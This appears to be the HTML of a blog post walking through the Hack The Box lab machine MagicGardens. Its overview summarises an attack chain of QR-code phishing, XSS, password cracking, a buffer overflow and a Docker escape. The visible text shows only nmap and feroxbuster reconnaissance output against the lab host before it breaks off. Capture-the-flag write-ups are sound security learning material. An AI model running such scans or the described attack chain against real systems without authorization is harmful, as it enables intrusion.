<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Foued SAIDI">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://fouedsaidi.com/2025/02/07/hackthebox-magicgardens/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="OverviewMagicGardens is an insane-difficulty machine from Hack The Box. It deals initially with a phishing attack that will trigger and XSS vulnerability through crafting a malicious QR Code which giv">
<meta property="og:type" content="article">
<meta property="og:title" content="Hackthebox: MagicGardens">
<meta property="og:url" content="http://fouedsaidi.com/2025/02/07/Hackthebox-MagicGardens/index.html">
<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
<meta property="og:description" content="OverviewMagicGardens is an insane-difficulty machine from Hack The Box. It deals initially with a phishing attack that will trigger and XSS vulnerability through crafting a malicious QR Code which giv">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/MagicGardens.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/web.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/web1.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/web2.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/web3.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/web4.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/web5.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/web6.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/qr.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/web7.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/web8.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/qr1.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/web9.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/web10.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/web11.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/web12.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/harvest.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/harvest1.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/harvest2.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/harvest3.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/harvest4.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/harvest5.png">
<meta property="article:published_time" content="2025-02-07T16:44:02.000Z">
<meta property="article:modified_time" content="2025-02-08T11:49:50.000Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/MagicGardens/MagicGardens.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
    <meta name="theme-color" content="#5618ff">
    <link rel="shortcut icon" href="/images/logo.png">
    <!--- Page Info-->
    
    <title>
        
            Hackthebox: MagicGardens -
        
        Foued Saidi&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI üëã","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <span class="swup-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Foued Saidi&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        HOME
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/archives"  >
                                    
                                        
                                            <i class="fa-regular fa-archive"></i>
                                        
                                        ARCHIVES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/categories"  >
                                    
                                        
                                            <i class="fa-regular fa-folder"></i>
                                        
                                        CATEGORIES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown" 
                                    href="#" onClick="return false;">
                                    
                                        
                                            <i class="fa-regular fa-user"></i>
                                        
                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
                                    
                                </a>
                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                    
                                        <li>
                                        <a href="/about">ME
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
                                        </a>
                                        </li>
                                    
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                HOME
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/archives"  >
                             
                                
                                    <i class="fa-regular fa-archive"></i>
                                
                                ARCHIVES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/categories"  >
                             
                                
                                    <i class="fa-regular fa-folder"></i>
                                
                                CATEGORIES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
                        href="#" onClick="return false;">
                            
                                
                                    <i class="fa-regular fa-user"></i>
                                
                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                              
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" href="/about">ME</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
                            </li>
                        
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: MagicGardens</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/logo.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-02-07 19:44:02</span>
        <span class="mobile">2025-02-07 19:44:02</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-02-08 14:49:50</span>
            <span class="mobile">2025-02-08 14:49:50</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>MagicGardens is an insane-difficulty machine from Hack The Box. It deals initially with a phishing attack that will trigger and XSS vulnerability through crafting a malicious QR Code which gives us access to a Django Administrator admin account where we‚Äôll crack a password an land a shell on the Morty user. Later we‚Äôll be reverse engineering a Network Monitoring tool named Harvest in order to trigger a BoF vulnerability and get access to user flag. Finally we‚Äôll be utilizing a cool Docker Escape Technique which will lead us to creating and injecting a custom Kernel module to escape the Docker container and land a root shell.</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/MagicGardens/MagicGardens.png"
                      alt="MagicGardens-info-card"
                ><figcaption>MagicGardens-info-card</figcaption></figure></p>
<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">41.157</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-09-23</span> <span class="number">15</span>:<span class="number">43</span> W. Central Africa Standard Time</span><br><span class="line">NSOCK ERROR <span class="function">[<span class="number">0.2650</span><span class="type">s</span>] <span class="title">ssl_init_helper</span></span>(): OpenSSL legacy provider failed to load.</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">231.24</span></span><br><span class="line">Host is up (<span class="number">0.12</span>s latency).</span><br><span class="line">Not shown: <span class="number">996</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE    SERVICE  VERSION</span><br><span class="line"><span class="number">22</span>/tcp   open     ssh      OpenSSH <span class="number">9.2</span>p1 Debian <span class="number">2</span>+deb12u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">256</span> e072624899334ffc59f86c0559dba77b (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">62</span>c6357e823eb10f9b6f5beafec5859a (ED25519)</span><br><span class="line"><span class="number">25</span>/tcp   filtered smtp</span><br><span class="line"><span class="number">80</span>/tcp   open     http     nginx <span class="number">1.22</span>.<span class="number">1</span></span><br><span class="line">|_http<span class="literal">-title</span>: Did not follow redirect to http://magicgardens.htb/</span><br><span class="line">|_http<span class="literal">-server-header</span>: nginx/<span class="number">1.22</span>.<span class="number">1</span></span><br><span class="line"><span class="number">5000</span>/tcp open     ssl/http Docker Registry (API: <span class="number">2.0</span>)</span><br><span class="line">|_http<span class="literal">-title</span>: Site doesn<span class="string">&#x27;t have a title.</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU</span></span><br><span class="line"><span class="string">| Not valid before: 2023-05-23T11:57:43</span></span><br><span class="line"><span class="string">|_Not valid after:  2024-05-22T11:57:43</span></span><br><span class="line"><span class="string">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span></span><br><span class="line"><span class="string">TCP/IP fingerprint:</span></span><br><span class="line"><span class="string">OS:SCAN(V=7.93%E=4%D=9/23%OT=22%CT=1%CU=32132%PV=Y%DS=2%DC=T%G=Y%TM=66F17F0</span></span><br><span class="line"><span class="string">OS:B%P=i686-pc-windows-windows)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A</span></span><br><span class="line"><span class="string">OS:)SEQ(CI=Z%II=I)OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54E</span></span><br><span class="line"><span class="string">OS:ST11NW7%O5=M54EST11NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W</span></span><br><span class="line"><span class="string">OS:5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y</span></span><br><span class="line"><span class="string">OS:%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F</span></span><br><span class="line"><span class="string">OS:=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%</span></span><br><span class="line"><span class="string">OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD</span></span><br><span class="line"><span class="string">OS:=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE</span></span><br><span class="line"><span class="string">OS:(R=Y%DFI=N%T=40%CD=S)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Network Distance: 2 hops</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE (using port 554/tcp)</span></span><br><span class="line"><span class="string">HOP RTT       ADDRESS</span></span><br><span class="line"><span class="string">1   186.00 ms 10.10.16.1</span></span><br><span class="line"><span class="string">2   70.00 ms  10.129.231.24</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 101.68 seconds</span></span><br></pre></td></tr></table></figure></div>

<p>We‚Äôve got a web app running on port 80 that‚Äôs redirecting us towards <code>magicgardens.htb</code> (which we‚Äôll add to our &#x2F;etc&#x2F;hosts file) and a Docker instance running on port 5000.</p>
<h4 id="Directory-Bruteforcing-using-FeroxBuster"><a href="#Directory-Bruteforcing-using-FeroxBuster" class="headerlink" title="Directory Bruteforcing using FeroxBuster"></a>Directory Bruteforcing using FeroxBuster</h4><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen\Tools&gt; feroxbuster.exe <span class="literal">-u</span> http://magicgardens.htb</span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher ü§ì                 ver: <span class="number">2.8</span>.<span class="number">0</span></span><br><span class="line">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span><br><span class="line"> üéØ  Target Url            ‚îÇ http://magicgardens.htb</span><br><span class="line"> üöÄ  Threads               ‚îÇ <span class="number">50</span></span><br><span class="line"> üìñ  Wordlist              ‚îÇ .\SecLists\Discovery\Web<span class="literal">-Content</span>\raft<span class="literal">-medium-directories</span>.txt</span><br><span class="line"> üëå  Status Codes          ‚îÇ All Status Codes!</span><br><span class="line"> üí•  Timeout (secs)        ‚îÇ <span class="number">7</span></span><br><span class="line"> ü¶°  User<span class="literal">-Agent</span>            ‚îÇ feroxbuster/<span class="number">2.8</span>.<span class="number">0</span></span><br><span class="line"> üèÅ  HTTP methods          ‚îÇ [<span class="type">GET</span>]</span><br><span class="line"> üîÉ  Recursion Depth       ‚îÇ <span class="number">4</span></span><br><span class="line"> üéâ  New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest</span><br><span class="line">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span><br><span class="line"> üèÅ  Press [<span class="type">ENTER</span>] to use the Scan Management Menu‚Ñ¢</span><br><span class="line">‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ</span><br><span class="line">WLD        -         -         -         - http://magicgardens.htb =&gt; auto<span class="literal">-filtering</span> <span class="number">404</span><span class="operator">-like</span> response (<span class="number">179</span> bytes); toggle this behavior by <span class="keyword">using</span> --dont-filter</span><br><span class="line"><span class="number">301</span>      GET        <span class="number">0</span>l        <span class="number">0</span>w        <span class="number">0</span>c http://magicgardens.htb/admin =&gt; http://magicgardens.htb/admin/</span><br><span class="line"><span class="number">301</span>      GET        <span class="number">0</span>l        <span class="number">0</span>w        <span class="number">0</span>c http://magicgardens.htb/register =&gt; http://magicgardens.htb/register/</span><br><span class="line"><span class="number">301</span>      GET        <span class="number">0</span>l        <span class="number">0</span>w        <span class="number">0</span>c http://magicgardens.htb/logout =&gt; http://magicgardens.htb/logout/</span><br><span class="line"><span class="number">200</span>      GET      <span class="number">458</span>l     <span class="number">1853</span>w    <span class="number">30861</span>c http://magicgardens.htb/</span><br><span class="line"><span class="number">301</span>      GET        <span class="number">0</span>l        <span class="number">0</span>w        <span class="number">0</span>c http://magicgardens.htb/login =&gt; http://magicgardens.htb/login/</span><br><span class="line"><span class="number">301</span>      GET        <span class="number">0</span>l        <span class="number">0</span>w        <span class="number">0</span>c http://magicgardens.htb/catalog =&gt; http://magicgardens.htb/catalog/</span><br><span class="line"><span class="number">301</span>      GET        <span class="number">0</span>l        <span class="number">0</span>w        <span class="number">0</span>c http://magicgardens.htb/search =&gt; http://magicgardens.htb/search/</span><br><span class="line"><span class="number">301</span>      GET        <span class="number">0</span>l        <span class="number">0</span>w        <span class="number">0</span>c http://magicgardens.htb/cart =&gt; http://magicgardens.htb/cart/</span><br><span class="line"><span class="number">301</span>      GET        <span class="number">0</span>l        <span class="number">0</span>w        <span class="number">0</span>c http://magicgardens.htb/profile =&gt; http://magicgardens.htb/profile/</span><br><span class="line">WLD        -         -         -         - http://magicgardens.htb/admin =&gt; auto<span class="literal">-filtering</span> <span class="number">404</span><span class="operator">-like</span> response (<span class="number">0</span> bytes); toggle this behavior by <span class="keyword">using</span> --dont-filter</span><br><span class="line">üö® Caught ctrl+c üö® saving scan state to ferox<span class="literal">-http_magicgardens_htb-1727963765</span>.state ...</span><br><span class="line">[&gt;-------------------] - <span class="number">3</span>s       <span class="number">683</span>/<span class="number">270000</span>  <span class="number">22</span>m     found:<span class="number">9</span>       errors:<span class="number">0</span></span><br><span class="line">[&gt;-------------------] - <span class="number">3</span>s       <span class="number">360</span>/<span class="number">30000</span>   <span class="number">107</span>/s   http://magicgardens.htb/</span><br><span class="line">[&gt;-------------------] - <span class="number">2</span>s       <span class="number">104</span>/<span class="number">30000</span>   <span class="number">37</span>/s    http://magicgardens.htb/admin/</span><br><span class="line">[&gt;-------------------] - <span class="number">2</span>s        <span class="number">54</span>/<span class="number">30000</span>   <span class="number">18</span>/s    http://magicgardens.htb/register/</span><br><span class="line">[&gt;-------------------] - <span class="number">2</span>s       <span class="number">104</span>/<span class="number">30000</span>   <span class="number">38</span>/s    http://magicgardens.htb/logout/</span><br><span class="line">[&gt;-------------------] - <span class="number">2</span>s        <span class="number">41</span>/<span class="number">30000</span>   <span class="number">14</span>/s    http://magicgardens.htb/login/</span><br><span class="line">[&gt;-------------------] - <span class="number">2</span>s         <span class="number">4</span>/<span class="number">30000</span>   <span class="number">1</span>/s     http://magicgardens.htb/search/</span><br><span class="line">[--------------------] - <span class="number">0</span>s         <span class="number">0</span>/<span class="number">30000</span>   <span class="number">0</span>/s     http://magicgardens.htb/catalog/</span><br><span class="line">[--------------------] - <span class="number">0</span>s         <span class="number">0</span>/<span class="number">30000</span>   <span class="number">0</span>/s     http://magicgardens.htb/cart/</span><br><span class="line">[--------------------] - <span 